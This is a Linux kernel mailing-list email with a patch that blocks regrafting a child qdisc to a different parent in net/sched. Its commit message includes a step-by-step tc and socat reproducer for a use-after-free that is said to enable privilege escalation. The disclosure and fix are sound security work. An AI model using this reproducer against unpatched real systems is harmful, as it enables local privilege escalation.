Return-Path: <netdev+bounces-156717-lists+netdev=lfdr.de@vger.kernel.org>
X-Original-To: lists+netdev@lfdr.de
Delivered-To: lists+netdev@lfdr.de
Received: from sv.mirrors.kernel.org (sv.mirrors.kernel.org [139.178.88.99])
	by mail.lfdr.de (Postfix) with ESMTPS id 42767A0794D
	for <lists+netdev@lfdr.de>; Thu,  9 Jan 2025 15:33:42 +0100 (CET)
Received: from smtp.subspace.kernel.org (relay.kernel.org [52.25.139.140])
	(using TLSv1.2 with cipher ECDHE-ECDSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by sv.mirrors.kernel.org (Postfix) with ESMTPS id 5918A3A687F
	for <lists+netdev@lfdr.de>; Thu,  9 Jan 2025 14:33:33 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id D325021A44B;
	Thu,  9 Jan 2025 14:33:33 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=mojatatu-com.20230601.gappssmtp.com header.i=@mojatatu-com.20230601.gappssmtp.com header.b="ehd8K6rd"
X-Original-To: netdev@vger.kernel.org
Received: from mail-qv1-f45.google.com (mail-qv1-f45.google.com [209.85.219.45])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 08F3B217F5C
	for <netdev@vger.kernel.org>; Thu,  9 Jan 2025 14:33:31 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.219.45
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1736433213; cv=none; b=i1j4nvCmDTb+pniCbfkGLRzvKJVxJio4gXyeLFKhAicUN9lZUznuS6LzCgZ376DYsbf+pGnPvuvLdLN/YKJhnecdk2AK0jty6BXfLr9MKl2yjrsyshkMvMKrVwhXoFMhl+hAGY+SZHvs+Ip6MzDFhJsrYWloJrsKTFOdDK1IuLQ=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1736433213; c=relaxed/simple;
	bh=GxoeWheqa1Bswe4CNEi/p2cyGnsk21gCGaW7D+Uat/w=;
	h=From:To:Cc:Subject:Date:Message-Id:MIME-Version; b=QaaCjPRmaN/GyVNziw5kiT43bjhQ/pbFY0XInYg4PfqqggsBsm8KJCaxGGEqRDCjJ7NUAnXoKaHgJbTT44phtYOANomEAmmO9fW6ygIAtNF468wjF3QK/1cVB5uaUEpkTKhD/GxFUMeRv59s15u8kFBpQNAzhqN5YlVPUOYecDw=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=mojatatu.com; spf=none smtp.mailfrom=mojatatu.com; dkim=pass (2048-bit key) header.d=mojatatu-com.20230601.gappssmtp.com header.i=@mojatatu-com.20230601.gappssmtp.com header.b=ehd8K6rd; arc=none smtp.client-ip=209.85.219.45
Authentication-Results: smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=mojatatu.com
Authentication-Results: smtp.subspace.kernel.org; spf=none smtp.mailfrom=mojatatu.com
Received: by mail-qv1-f45.google.com with SMTP id 6a1803df08f44-6d8f916b40bso12476316d6.3
        for <netdev@vger.kernel.org>; Thu, 09 Jan 2025 06:33:31 -0800 (PST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=mojatatu-com.20230601.gappssmtp.com; s=20230601; t=1736433210; x=1737038010; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to;
        bh=rNOJzssBbBPnIolLWjeE0juUOIsSRVjcTqEOoZWI/+8=;
        b=ehd8K6rdOH7qBVkU/bRHM+gb1avb4d2REJL4ZPOAxQvhfOjnp2ZdOHFa0llxwaH5EN
         wKeUl0vAmNlsbRSG5CJFMPJl9/yO/SlOcKcVkJY/PRob1LlreUtoU1acZGX0590sDBlH
         dGOnS01uE/kBMG7voSGRQp0gLpqU26a5IuP4B8dJbGMhhnxyZRGgAme/2/0yiwnY4k41
         XJPN5FdQYE91V/ihRPTzoMsN9XsmE6Qu4wNj8k0PcTy21P54S8pkXcmxcYQGz/MjQKKl
         cEct896v9YfGutbVXleMs2l9MbhUReRbJrfv5ImRwfB3YoDXW833KjBsVLqWECi3YKjO
         yVqQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20230601; t=1736433210; x=1737038010;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-message-state:from:to:cc:subject:date:message-id
         :reply-to;
        bh=rNOJzssBbBPnIolLWjeE0juUOIsSRVjcTqEOoZWI/+8=;
        b=OUvFFQR0ZUnwwSjORssJ31twtp9rTUDwDvyW0n3C5rg2EshpypfcKLE2vWBcvPxNlG
         uKi6/XIJ93i3i12ciekpf6ssJu75/3uEK8IlkcAXoi6JEGxJ73vdYWA3HdIR8L9hno5t
         bHynMprLuVXkwnjrIXlRkrGcak3cJoVLCtphKlwyAaqtAw8gGnF72Dg+plZd9GrkiUvt
         r6TXSbZ8VvIBfbT+9/ZKQBMSnAJNDsJRBpCzrF/3tZK/N9hWs3GXUpqw/B6IUuV+/BLO
         q2MDf8cw3nB8ZeCOOjCg47ux212nsg9u1GFU5/FW5tYhWfPvrwTU638C9qNAVS6c9x/n
         Phng==
X-Gm-Message-State: AOJu0YxVJf88cocNjHFcUkBX7ANuJoOsnW/zUh+M1kH4FiRjxPwwZunF
	BOT/G13mnWJOQ9iJMVRRqEH3UE7N3yWj5cPAOjg8Zuq5SsB0gw2u7Hlm9wivKCdm80fRabIPRcs
	=
X-Gm-Gg: ASbGncuJYqxTaDIJZtBrvA+K4jEvIA7KIKGj7TdG6obp7p9YKD/10UdJpJTgSP3DkhM
	w2E4LO0KXtenp0p6rI1qnwFJLHxfp9NneButit0dokl8jHe6mrtnp97u8iiZfvNHgIdTgDpYQGH
	dJjBtowjH2QBmpNdTo6OsEvQi5GZEu6iIL75JgtNDQCJlAA31nT+6SRaWvVed5t5uHe2cpvadQd
	qHz7vzrPYjt82HnfQ5gUvCO6jg8pk7UZwGEzsNnh0OR67mV
X-Google-Smtp-Source: AGHT+IGfEaJrdJM5YVIWQdh4vynQlbmKP4zynNxlXbg8FPDXUky1+Yid/lwtU6mueCeZ21HVKPGxXw==
X-Received: by 2002:a05:6214:3f8f:b0:6d4:e0a:230e with SMTP id 6a1803df08f44-6df9b1ea402mr131813406d6.16.1736433210633;
        Thu, 09 Jan 2025 06:33:30 -0800 (PST)
Received: from majuu.waya ([76.64.65.230])
        by smtp.gmail.com with ESMTPSA id 6a1803df08f44-6dd18135f2fsm200205416d6.54.2025.01.09.06.33.29
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Thu, 09 Jan 2025 06:33:30 -0800 (PST)
From: Jamal Hadi Salim <jhs@mojatatu.com>
To: netdev@vger.kernel.org
Cc: jiri@resnulli.us,
	xiyou.wangcong@gmail.com,
	davem@davemloft.net,
	edumazet@google.com,
	kuba@kernel.org,
	security@kernel.org,
	nnamrec@gmail.com
Subject: [PATCH net 1/1 v2] net: sched: Disallow replacing of child qdisc from one parent to another
Date: Thu,  9 Jan 2025 09:33:19 -0500
Message-Id: <20250109143319.26433-1-jhs@mojatatu.com>
X-Mailer: git-send-email 2.34.1
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Lion Ackermann was able to create a UAF which can be abused for privilege
escalation with the following script

Step 1. create root qdisc
tc qdisc add dev lo root handle 1:0 drr

step2. a class for packet aggregation do demonstrate uaf
tc class add dev lo classid 1:1 drr

step3. a class for nesting
tc class add dev lo classid 1:2 drr

step4. a class to graft qdisc to
tc class add dev lo classid 1:3 drr

step5.
tc qdisc add dev lo parent 1:1 handle 2:0 plug limit 1024

step6.
tc qdisc add dev lo parent 1:2 handle 3:0 drr

step7.
tc class add dev lo classid 3:1 drr

step 8.
tc qdisc add dev lo parent 3:1 handle 4:0 pfifo

step 9. Display the class/qdisc layout

tc class ls dev lo
 class drr 1:1 root leaf 2: quantum 64Kb
 class drr 1:2 root leaf 3: quantum 64Kb
 class drr 3:1 root leaf 4: quantum 64Kb

tc qdisc ls
 qdisc drr 1: dev lo root refcnt 2
 qdisc plug 2: dev lo parent 1:1
 qdisc pfifo 4: dev lo parent 3:1 limit 1000p
 qdisc drr 3: dev lo parent 1:2

step10. trigger the bug <=== prevented by this patch
tc qdisc replace dev lo parent 1:3 handle 4:0

step 11. Redisplay again the qdiscs/classes

tc class ls dev lo
 class drr 1:1 root leaf 2: quantum 64Kb
 class drr 1:2 root leaf 3: quantum 64Kb
 class drr 1:3 root leaf 4: quantum 64Kb
 class drr 3:1 root leaf 4: quantum 64Kb

tc qdisc ls
 qdisc drr 1: dev lo root refcnt 2
 qdisc plug 2: dev lo parent 1:1
 qdisc pfifo 4: dev lo parent 3:1 refcnt 2 limit 1000p
 qdisc drr 3: dev lo parent 1:2

Observe that a) parent for 4:0 does not change despite the replace request.
There can only be one parent.  b) refcount has gone up by two for 4:0 and
c) both class 1:3 and 3:1 are pointing to it.

Step 12.  send one packet to plug
echo "" | socat -u STDIN UDP4-DATAGRAM:127.0.0.1:8888,priority=$((0x10001))
step13.  send one packet to the grafted fifo
echo "" | socat -u STDIN UDP4-DATAGRAM:127.0.0.1:8888,priority=$((0x10003))

step14. lets trigger the uaf
tc class delete dev lo classid 1:3
tc class delete dev lo classid 1:1

The semantics of "replace" is for a del/add _on the same node_ and not
a delete from one node(3:1) and add to another node (1:3) as in step10.
While we could "fix" with a more complex approach there could be
consequences to expectations so the patch takes the preventive approach of
"disallow such config".

Joint work with Lion Ackermann <nnamrec@gmail.com>

Signed-off-by: Jamal Hadi Salim <jhs@mojatatu.com>
---
 net/sched/sch_api.c | 10 ++++++++--
 1 file changed, 8 insertions(+), 2 deletions(-)

diff --git a/net/sched/sch_api.c b/net/sched/sch_api.c
index 300430b8c4d2..79e0b5c919a9 100644
--- a/net/sched/sch_api.c
+++ b/net/sched/sch_api.c
@@ -1612,7 +1612,7 @@ static int tc_modify_qdisc(struct sk_buff *skb, struct nlmsghdr *n,
 	struct nlattr *tca[TCA_MAX + 1];
 	struct net_device *dev;
 	u32 clid;
-	struct Qdisc *q, *p;
+	struct Qdisc *leaf_q, *q, *p;
 	int err;
 
 replay:
@@ -1624,7 +1624,7 @@ static int tc_modify_qdisc(struct sk_buff *skb, struct nlmsghdr *n,
 
 	tcm = nlmsg_data(n);
 	clid = tcm->tcm_parent;
-	q = p = NULL;
+	leaf_q = q = p = NULL;
 
 	dev = __dev_get_by_index(net, tcm->tcm_ifindex);
 	if (!dev)
@@ -1640,6 +1640,7 @@ static int tc_modify_qdisc(struct sk_buff *skb, struct nlmsghdr *n,
 					return -ENOENT;
 				}
 				q = qdisc_leaf(p, clid);
+				leaf_q = q;
 			} else if (dev_ingress_queue_create(dev)) {
 				q = rtnl_dereference(dev_ingress_queue(dev)->qdisc_sleeping);
 			}
@@ -1673,6 +1674,11 @@ static int tc_modify_qdisc(struct sk_buff *skb, struct nlmsghdr *n,
 					NL_SET_ERR_MSG(extack, "Invalid qdisc name");
 					return -EINVAL;
 				}
+				if (leaf_q && leaf_q->parent != q->parent) {
+					NL_SET_ERR_MSG(extack, "Invalid Parent for operation");
+					return -EINVAL;
+				}
+
 				if (q->flags & TCQ_F_INGRESS) {
 					NL_SET_ERR_MSG(extack,
 						       "Cannot regraft ingress or clsact Qdiscs");
-- 
2.34.1


